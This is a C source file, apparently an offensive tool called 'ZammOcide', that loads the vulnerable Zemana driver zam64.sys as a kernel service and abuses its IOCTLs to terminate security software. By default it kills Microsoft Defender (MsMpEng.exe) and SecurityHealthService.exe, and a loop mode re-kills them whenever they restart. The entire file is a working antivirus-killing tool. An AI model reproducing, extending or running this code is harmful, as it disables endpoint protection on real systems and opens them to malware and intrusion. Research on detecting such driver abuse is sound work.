#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>

#define REGISTER_PROCESS_IOCTL 0x80002010
#define TERMINATE_PROCESS_IOCTL 0x80002048


const char* avlist[] = { "SecurityHealthService.exe", "MsMpEng.exe" };


BOOL LoadDriver(LPCSTR driverPath, LPCSTR driverName) {
	SC_HANDLE hSCManager = NULL;
	SC_HANDLE hService = NULL;
	BOOL result = FALSE;

	// Apri il gestore del Service Control Manager
	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (!hSCManager) {
		printf("Errore: impossibile aprire il Service Control Manager (%d)\n", GetLastError());
		return FALSE;
	}

	// Crea il servizio per il driver
	hService = CreateServiceA(
		hSCManager,
		driverName,
		driverName,
		SERVICE_START | DELETE | SERVICE_STOP,
		SERVICE_KERNEL_DRIVER,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_IGNORE,
		driverPath,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);

	if (!hService) {
		DWORD error = GetLastError();
		if (error == ERROR_SERVICE_EXISTS) {
			printf("Il servizio esiste già, tentando di aprirlo...\n");
			hService = OpenServiceA(hSCManager, driverName, SERVICE_START | DELETE | SERVICE_STOP);
		}
		else {
			printf("Errore: impossibile creare il servizio (%d)\n", error);
			CloseServiceHandle(hSCManager);
			return FALSE;
		}
	}

	// Avvia il servizio (carica il driver)
	if (!StartServiceA(hService, 0, NULL)) {
		DWORD error = GetLastError();
		if (error != ERROR_SERVICE_ALREADY_RUNNING) {
			printf("Errore: impossibile avviare il servizio (%d)\n", error);
			goto cleanup;
		}
	}

	printf("Driver caricato con successo.\n");
	result = TRUE;

cleanup:
	// Rimuove il servizio (opzionale: lo carica una volta sola)
	if (hService) {
		DeleteService(hService);
		CloseServiceHandle(hService);
	}
	if (hSCManager) {
		CloseServiceHandle(hSCManager);
	}

	return result;
}


DWORD FindProcessByName(const char* processName) {
	HANDLE hSnapshot;
	PROCESSENTRY32 pe32;
	DWORD pid = 0;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("Errore: impossibile creare l'istantanea dei processi (%d)\n", GetLastError());
		return 0;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapshot, &pe32)) {
		do {
			char convertedName[MAX_PATH];
			// Converte il nome del processo in multibyte
			wcstombs_s(NULL, convertedName, MAX_PATH, pe32.szExeFile, MAX_PATH);

			// Confronta il nome del processo
			if (_stricmp(convertedName, processName) == 0) {
				pid = pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &pe32));
	}
	else {
		printf("Errore: impossibile enumerare i processi (%d)\n", GetLastError());
	}

	CloseHandle(hSnapshot);
	return pid;
}

BOOL RegisterProcessByIOCTL(HANDLE hDevice) {



	DWORD pid, BytesReturned;

	pid = GetCurrentProcessId();
	if (!DeviceIoControl(hDevice, REGISTER_PROCESS_IOCTL, &pid, sizeof(DWORD), NULL, 0, &BytesReturned, NULL))
	{
		printf("Failed to register process\n");
		return FALSE;
	}

	return TRUE;
}

BOOL TerminateProcessByIOCTL(HANDLE hDevice, DWORD pid) {
	DWORD BytesReturned;

	if (!DeviceIoControl(hDevice, TERMINATE_PROCESS_IOCTL, &pid, sizeof(DWORD), NULL, 0, &BytesReturned, NULL))
	{
		printf("Failed to terminate process\n");
		return FALSE;
	}

	return TRUE;
}


int isProcessRunning(DWORD pid) {
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (hProcess) {
		// Se il processo è aperto correttamente, è in esecuzione
		CloseHandle(hProcess);
		return 1;
	}
	return 0;
}


int main(int argc, char** argv) {
	//if (argc != 2) {
	//	printf("Usage: %s <PID>\n", argv[0]);
	//	return 1;
	//}


	printf(" /$$$$$$$$                                        /$$$$$$            /$$       /$$          \n");
	printf("|_____ $$                                        /$$__  $$          |__/      | $$          \n");
	printf("     /$$/   /$$$$$$  /$$$$$$/$$$$  /$$$$$$/$$$$ | $$  \\ $$  /$$$$$$$ /$$  /$$$$$$$  /$$$$$$ \n");
	printf("    /$$/   |____  $$| $$_  $$_  $$| $$_  $$_  $$| $$  | $$ /$$_____/| $$ /$$__  $$ /$$__  $$\n");
	printf("   /$$/     /$$$$$$$| $$ \\ $$ \\ $$| $$ \\ $$ \\ $$| $$  | $$| $$      | $$| $$  | $$| $$$$$$$$\n");
	printf("  /$$/     /$$__  $$| $$ | $$ | $$| $$ | $$ | $$| $$  | $$| $$      | $$| $$  | $$| $$_____/\n");
	printf(" /$$$$$$$$|  $$$$$$$| $$ | $$ | $$| $$ | $$ | $$|  $$$$$$/|  $$$$$$$| $$|  $$$$$$$|  $$$$$$$\n");
	printf("|________/ \\_______/|__/ |__/ |__/|__/ |__/ |__/ \\______/  \\_______/|__/ \\_______/ \\_______/\n");
	printf("                                                                                             \n");
	printf("                                                                                             \n");
	printf("                                                                                            \n\n\n\n\n");



	printf("##################################################################################################################\n");

	printf("Authors: \nJacopo Di benedetto, https://github.com/jakydibe\nAiman Rattab, Https://github.com/Hightness\n\n\n\n");



	printf("use --pid <PID> to terminate a process with PID. otherwise just ./ZammOcide to kill default AVs processes.\n");
	printf("use --loop to keep the program running and killing the processes whenever they spawn.\n");
	printf("use --path <PATH> to specify the path of the driver to load. Default is my path C:\\Users\\jak\\Downloads\\zam64.sys\n\n\n");
	printf("GO TO https://www.loldrivers.io/drivers/e5f12b82-8d07-474e-9587-8c7b3714d60c/   https://www.loldrivers.io/ TO DOWNLOAD ZAM64.SYS\n");

	printf("##################################################################################################################\n\n\n\n");

	LPCSTR driverPath = "C:\\Users\\jak\\Downloads\\zam64.sys";
	LPCSTR driverName = "ZammOcide";


	int pid = 0;


	int loop = 0;

	for (int i = 0; i < argc; i++) {
		if (strcmp(argv[i], "--loop") == 0) {
			loop = 1;
		}

		if (strcmp(argv[i], "--pid") == 0) {
			pid = atoi(argv[i + 1]);
		}
		if (strcmp(argv[i], "--path") == 0) {
			driverPath = (LPCSTR)argv[i + 1];
		}
	}



	// prima di caricare il driver checka se esiste
	SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCManager == NULL) {
		printf("Failed to open SC Manager\n");
		return 1;
	}


	SC_HANDLE hService = OpenServiceA(hSCManager, driverName, SERVICE_ALL_ACCESS);
	if (hService != NULL) {
		printf("Driver already exists. Continuing....\n");
	}
	else {
		LoadDriver(driverPath, driverName);
		printf("Driver loaded\n");
	}


	HANDLE hDevice = CreateFileA("\\\\.\\ZemanaAntiMalware", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("Failed to open device\n");
		return 1;
	}


	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("Failed to open device\n");
		return 0;
	}


	if (!RegisterProcessByIOCTL(hDevice))
	{
		printf("Failed to register process\n");
		return 1;
	}







	// se si e' selezionato il pid con -p allora termina quel processo
	if (pid != 0) {
		printf("Terminating process with PID: %d\n\n", pid);
		if (loop == 1) {
			while (1) {
				// check if the process is still running
				if (isProcessRunning(pid) == 0) {
					printf("process with pid %d is not running. Sleeping 2 seconds....\n", pid);
					Sleep(2000);
					continue;
				}
				if (!TerminateProcessByIOCTL(hDevice, pid)) {
					printf("Failed to terminate process\n");
				}
				Sleep(1500);
			}
		}
		else {
			if (!TerminateProcessByIOCTL(hDevice, pid)) {
				printf("Failed to terminate process\n");
				return 1;
			}
		}
	}


	// i due da uccidere di default sono: SecurityHealthService.exe e MsMpEng.exe


	int avlist_size = sizeof(avlist) / sizeof(avlist[0]);

	printf("avlist_size = %d\n\n", avlist_size);


	printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");

	printf("\nAV Process LIST: \n");

	for (int i = 0; i < 2; i++) {
		printf("%s \n", avlist[i]);
	}
	printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");

	printf("\n\n\n");

	if (loop == 1) {
		while (1){
			for (int i = 0; i < avlist_size; i++) {
				pid = (int*)FindProcessByName(avlist[i]);
				if (isProcessRunning(pid) == 0) {
					printf("process %s is not running. Sleeping 2 seconds....\n", avlist[i]);
					Sleep(2000);
					continue;
				}
				if (pid != 0) {

					printf("Terminating %s    with PID: %d\n\n", avlist[i], pid);

					if (!TerminateProcessByIOCTL(hDevice, pid)) {
						printf("Failed to terminate process\n");
					}
				}
			}
		}
	}
	else {
		for (int i = 0; i < avlist_size; i++) {
			pid = (int*)FindProcessByName(avlist[i]);
			if (isProcessRunning(pid) == 0) {
				printf("process with pid %d is not running. Sleeping 2 seconds....\n", pid);
			}
			if (pid != 0) {

				printf("Terminating %s    with PID: %d\n\n", avlist[i], pid);

				if (!TerminateProcessByIOCTL(hDevice, pid)) {
					printf("Failed to terminate process\n");
					return 1;
				}
			}
		}
	}


	//if (!TerminateProcessByIOCTL(hDevice, pid)) {
	//	printf("Failed to terminate process\n");
	//	return 1;
	//}




	return 0;
}
